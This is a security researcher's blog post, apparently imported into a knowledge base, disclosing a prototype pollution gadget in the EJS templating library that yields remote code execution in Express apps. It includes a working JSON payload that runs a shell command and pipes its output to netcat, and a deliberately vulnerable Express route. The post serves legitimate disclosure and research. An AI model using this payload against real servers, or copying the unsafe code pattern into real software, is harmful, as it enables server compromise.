---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-09_ejs-server-side-prototype-pollution-gadgets-to-rce.md
original_filename: 2023-03-09_ejs-server-side-prototype-pollution-gadgets-to-rce.md
title: EJS - Server Side Prototype Pollution gadgets to RCE
category: documents
detected_topics:
- supply-chain
- xss
- command-injection
- api-security
tags:
- imported
- documents
- supply-chain
- xss
- command-injection
- api-security
language: en
raw_sha256: 911f1488d7dcf952dfb11238c5972586297894fb6cbb576c2bf4dbf065faed47
text_sha256: 912f44e5e305817d848c18ad109b2bd635edd6f12d558b46dd0a447fc4be3cd8
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# EJS - Server Side Prototype Pollution gadgets to RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-09_ejs-server-side-prototype-pollution-gadgets-to-rce.md
- Source Type: markdown
- Detected Topics: supply-chain, xss, command-injection, api-security
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `911f1488d7dcf952dfb11238c5972586297894fb6cbb576c2bf4dbf065faed47`
- Text SHA256: `912f44e5e305817d848c18ad109b2bd635edd6f12d558b46dd0a447fc4be3cd8`


## Content

---
title: "EJS - Server Side Prototype Pollution gadgets to RCE"
page_title: "EJS - Server Side Prototype Pollution gadgets to RCE | mizu.re"
url: "https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce"
final_url: "https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce"
authors: ["Mizu (@kevin_mizu)"]
programs: ["Node.js third-party modules (EJS)"]
bugs: ["Server-side prototype pollution", "RCE", "Security code review"]
publication_date: "2023-03-09"
added_date: "2023-03-10"
source: "pentester.land/writeups.json"
original_index: 1403
---

[/mizu.re](https://mizu.re/)

  * _search_ _close_

  * _arrow_drop_down_ /articles
  * [/EJS_RCE_Gadget](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
  * [/Electron_XSS_RCE](https://slides.com/kevin-mizu/electron-cve-2022-3133)
  * [/Root_me_XSS](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org)
  *  _arrow_drop_down_ /writeups
  * [/HeroCTFv5](https://mizu.re/tag/HeroCTF_v5)
  * [/FCSC_2023](https://mizu.re/tag/FCSC2023)
  * [/FCSC_2022](https://mizu.re/tag/FCSC2022)
  * [/RootMe_10k](https://mizu.re/tag/10kCTF_RootMe)
  * [/Yogosha2022](https://mizu.re/tag/YogoshaChristmas_2022)
  * [/EC2_2021](https://mizu.re/tag/EC2_2021)
  *  _arrow_drop_down_ /cve
  * [CVE-2023-3975](https://nvd.nist.gov/vuln/detail/CVE-2023-3975)
  * [CVE-2023-3974](https://nvd.nist.gov/vuln/detail/CVE-2023-3974)
  * [CVE-2023-3973](https://nvd.nist.gov/vuln/detail/CVE-2023-3973)
  * [CVE-2022-3133](https://nvd.nist.gov/vuln/detail/CVE-2022-3133)
  * [CVE-2022-3127](https://nvd.nist.gov/vuln/detail/CVE-2022-3127)
  * [CVE-2022-29361](https://nvd.nist.gov/vuln/detail/CVE-2022-29361)
  * [CVE-2022-2342](https://nvd.nist.gov/vuln/detail/CVE-2022-2342)
  * [CVE-2022-1850](https://nvd.nist.gov/vuln/detail/CVE-2022-1850)
  * [CVE-2022-1849](https://nvd.nist.gov/vuln/detail/CVE-2022-1849)
  * [/whoami](https://mizu.re/whoami)
  * _brightness_7_

  * _search_ _close_

  *  * /articles
  * [𑁋 /EJS_RCE_Gadget](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
  * [𑁋 /Electron_XSS_RCE](https://slides.com/kevin-mizu/electron-cve-2022-3133)
  * [𑁋 /Root_me_XSS](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org)
  *  *  * /writeups
  * [𑁋 /HeroCTFv5](https://mizu.re/tag/HeroCTF_v5)
  * [𑁋 /FCSC_2023](https://mizu.re/tag/FCSC2023)
  * [𑁋 /FCSC_2022](https://mizu.re/tag/FCSC2022)
  * [𑁋 /RootMe_10k](https://mizu.re/tag/10kCTF_RootMe)
  * [𑁋 /Yogosha2022](https://mizu.re/tag/YogoshaChristmas_2022)
  * [𑁋 /EC2_2021](https://mizu.re/tag/EC2_2021)
  *  *  * /cve
  * [𑁋 CVE-2023-3975](https://nvd.nist.gov/vuln/detail/CVE-2023-3975)
  * [𑁋 CVE-2023-3974](https://nvd.nist.gov/vuln/detail/CVE-2023-3974)
  * [𑁋 CVE-2023-3973](https://nvd.nist.gov/vuln/detail/CVE-2023-3973)
  * [𑁋 CVE-2022-3133](https://nvd.nist.gov/vuln/detail/CVE-2022-3133)
  * [𑁋 CVE-2022-3127](https://nvd.nist.gov/vuln/detail/CVE-2022-3127)
  * [𑁋 CVE-2022-29361](https://nvd.nist.gov/vuln/detail/CVE-2022-29361)
  * [𑁋 CVE-2022-2342](https://nvd.nist.gov/vuln/detail/CVE-2022-2342)
  * [𑁋 CVE-2022-1850](https://nvd.nist.gov/vuln/detail/CVE-2022-1850)
  * [𑁋 CVE-2022-1849](https://nvd.nist.gov/vuln/detail/CVE-2022-1849)
  *  * [/whoami](https://mizu.re/whoami)

_menu_

_keyboard_arrow_up_

[mizu.re](https://mizu.re/) [post](https://mizu.re/posts/) [EJS - Server Side Prototype Pollution gadgets to RCE]()

  

title: EJS - Server Side Prototype Pollution gadgets to RCE  
date: Mar 09, 2023  
tags: [Article](https://mizu.re/tag/Article) [Web](https://mizu.re/tag/Web) [SSPP](https://mizu.re/tag/SSPP)

  

# EJS - Server Side Prototype Pollution gadgets to RCE

  

  * 📜 Introduction
  * ❓ How to use EJS with express?
  * 🤖 SSPP Gadget
  * 💥 RCE Gadget
  * 👨‍💻 Final PoC

  

## 📜 Introdution

Last month (February 2023), I took a look into NodeJS HTML templating libraries. During my research, I found an interesting Server Side Prototype Pollution (SSPP) gadget in the EJS library which can be leveraged to RCE. After finding this issue, I spent a week searching for an SSPP in express core or dependencies, but I didn't find any issue. That's why, after reporting this issue to the repository maintainer, I'm making an article to explain technical details.

  

## ❓ How to use EJS with express?

Express framework brings a [view engine](https://expressjs.com/en/guide/using-template-engines.html) system which allows the developer to choose which templating library he wants to use. Thanks to the EJS compliance, it usage is really simple in case of an express application. The only thing that the developer has to do is creating a `/views` folder with HTML template and call `res.render()` function.

_Application folder_

![ejs_express.png](https://mizu.re/articles/articles/vuln03_ejs/images/ejs_express.png)

_app.js_
  
  
  // Setup app
  const express = require("express");
  const app  = express();
  const port = 3000;
  
  // Select ejs templating library
  app.set('view engine', 'ejs');
  
  // Routes
  app.get("/", (req, res) => {
  res.render("index");
  })
  
  // Start app
  app.listen(port, () => {
  console.log(`App listening on port ${port}`)
  })

  

## 🤖 SSPP Gadget

EJS maintainers have a really good understanding of SSPP issues and sanitize each object they create using a pretty secure function.

_[Render()](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L415)_
  
  
  exports.render = function (template, d, o) {
  var data = d || utils.createNullProtoObjWherePossible();
  var opts = o || utils.createNullProtoObjWherePossible();
  
  // No options object -- if there are optiony names
  // in the data, copy them to options
  if (arguments.length == 2) {
  utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
  }
  
  return handleCache(opts, template)(data);
  };

_[createNullProtoObjWherePossible()](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/utils.js#L208)_
  
  
  exports.createNullProtoObjWherePossible = (function () {
  if (typeof Object.create == 'function') {
  return function () {
  return Object.create(null);
  };
  }
  if (!({__proto__: null} instanceof Object)) {
  return function () {
  return {__proto__: null};
  };
  }
  
  // Not possible, just pass through
  return function () {
  return {};
  };
  })();

As you can see from the above snippets, it is impossible to abuse SSPP to infect **newly** created object inside the library. Therefore, this is not true for user's provided objects. Why? From EJS maintainer's perspective, inputs provided by users to the library aren't the responsibility of EJS ([security.md](https://github.com/mde/ejs/blob/main/SECURITY.md)).

If we assume the `d` object (user's config) has an infected prototype, it will bypass all the protections. In this case, when the [Template](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L397) object is created, infected options will be used.
  
  
  exports.compile = function compile(template, opts) {
  var templ;
  
  ...
  
  templ = new Template(template, opts);
  return templ.compile();
  };

  

## 💥 RCE gadget

Now that we know that it is possible to control the prototype of the config object, it allows to go further in the exploitation. In order to prepare the templating, EJS compile a [function](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L571) which will later be evaluated to create the HTML markup.

![eval.png](https://mizu.re/articles/articles/vuln03_ejs/images/eval.png)

In addition, EJS uses several config elements to generate this function. Most of them are sanitized using [_JS_IDENTIFIER](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L68) regex. Thanks for us, this is not the case for all of them!
  
  
  compile: function () {
  /** @type {string} */
  var src;
  /** @type {ClientFunction} */
  var fn;
  var opts = this.opts;
  var prepended = '';
  var appended = '';
  /** @type {EscapeCallback} */
  var escapeFn = opts.escapeFunction;
  /** @type {FunctionConstructor} */
  var ctor;
  /** @type {string} */
  var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : 'undefined';
  
  ...
  
  if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
  if (opts.compileDebug) {
  src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
  }
  }
  
  ...
  
  return returnedFn;

As we can see from the above snippet, if `opts.client` **exists** , `opts.escapeFunction` attribute will be reflected inside the [function body](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L636). As [opts.client](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L518) and [opts.escapeFunction](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L519) aren't set by default, it is possible to use them to reach the eval sink and get a RCE!
  
  
  {
  "__proto__": {
  "client": 1,
  "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
  }
  }

  

## 👨‍💻 Final PoC

Express views use a [default config](https://github.com/expressjs/express/blob/0debedf4f31bb20203da0534719b9b10d6ac9a29/lib/response.js#L1039) when calling templating function, which make it **vulnerable by default**! 

_Vulnerable application_
  
  
  // Setup app
  const express = require("express");
  const app  = express();
  const port = 3000;
  
  // Select ejs templating library
  app.set('view engine', 'ejs');
  
  // Routes
  app.get("/", (req, res) => {
  res.render("index");
  })
  
  app.get("/vuln", (req, res) => {
  // simulate SSPP vulnerability
  var a = req.query.a;
  var b = req.query.b;
  var c = req.query.c;
  
  var obj = {};
  obj[a][b] = c;
  
  res.send("OK!");
  })
  
  // Start app
  app.listen(port, () => {
  console.log(`App listening on port ${port}`)
  })

_PoC_

![poc.png](https://mizu.re/articles/articles/vuln03_ejs/images/poc.png)

_Shell_

![rce.png](https://mizu.re/articles/articles/vuln03_ejs/images/rce.png)

  

[_keyboard_arrow_left_ Intigriti March 2023 - XSS Challenge](https://mizu.re/post/intigriti-march-2023-xss-challenge)

[Last Battle _keyboard_arrow_right_](https://mizu.re/post/last_battle)

##### [mizu.re](https://mizu.re/)

Mizu's website

##### Site map

  * [Home](https://mizu.re/)
  * [Posts](https://mizu.re/posts)
  * [Tags](https://mizu.re/tag)
  * [Whoami](https://mizu.re/whoami)

© 2021 Mizu [licences](https://mizu.re/licences)
